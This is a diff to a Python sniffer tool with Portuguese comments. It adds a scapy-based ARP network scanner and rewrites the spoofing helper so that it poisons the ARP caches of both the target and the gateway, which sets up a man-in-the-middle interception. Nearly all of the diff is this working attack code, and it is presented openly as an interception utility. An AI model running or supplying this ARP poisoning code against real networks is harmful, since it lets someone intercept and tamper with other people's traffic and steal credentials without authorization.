@@ -96,21 +96,48 @@ class DSISniffer:
         self.is_running = False
         self.log("Sniffer Grão-Mestre desativado.", log_type="info")
 
-# --- Ferramenta Auxiliar: ARP Spoofing (Intercepção) ---
-def get_mac(ip):
-    arp_request = scapy.ARP(pdst=ip)
-    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast/arp_request
-    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-    return answered_list[0][1].hwsrc
+# --- Ferramenta Auxiliar: ARP Scanner & Spoofing ---
+def scan_network(interface):
+    """ Escaneia a rede local em busca de dispositivos ativos """
+    # Tenta descobrir o range da rede (ex: 192.168.1.0/24)
+    # Para simplificar no expert mode, vamos pedir o IP do gateway ou assumir /24
+    # Aqui usaremos um scan ARP rápido
+    print(f"[*] Iniciando Varredura ARP na interface {interface}...")
+    try:
+        # Pega o IP local para deduzir o range
+        import netifaces
+        addrs = netifaces.ifaddresses(interface)
+        ip_info = addrs[netifaces.AF_INET][0]
+        ip = ip_info['addr']
+        mask = ip_info['netmask']
+        # Simplificação: assume /24
+        network = ".".join(ip.split(".")[:-1]) + ".0/24"
+        
+        ans, unans = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=network), timeout=2, iface=interface, verbose=False)
+        devices = []
+        for sent, received in ans:
+            devices.append({'ip': received.psrc, 'mac': received.hwsrc})
+        return devices
+    except Exception as e:
+        print(f"[!] Erro no scanner: {e}")
+        return []
 
-def spoof(target_ip, gateway_ip):
-    target_mac = get_mac(target_ip)
-    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
-    scapy.send(packet, verbose=False)
+def get_mac(ip, interface):
+    try:
+        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, iface=interface, verbose=False)
+        if ans: return ans[0][1].hwsrc
+    except: pass
+    return None
 
-def restore_arp(dest_ip, source_ip):
-    dest_mac = get_mac(dest_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
-    scapy.send(packet, count=4, verbose=False)
+def spoof(target_ip, gateway_ip, interface):
+    target_mac = get_mac(target_ip, interface)
+    gateway_mac = get_mac(gateway_ip, interface)
+    if target_mac and gateway_mac:
+        # Envenena Alvo
+        p1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
+        # Envenena Gateway
+        p2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
+        scapy.send(p1, verbose=False, iface=interface)
+        scapy.send(p2, verbose=False, iface=interface)
+        return True
+    return False
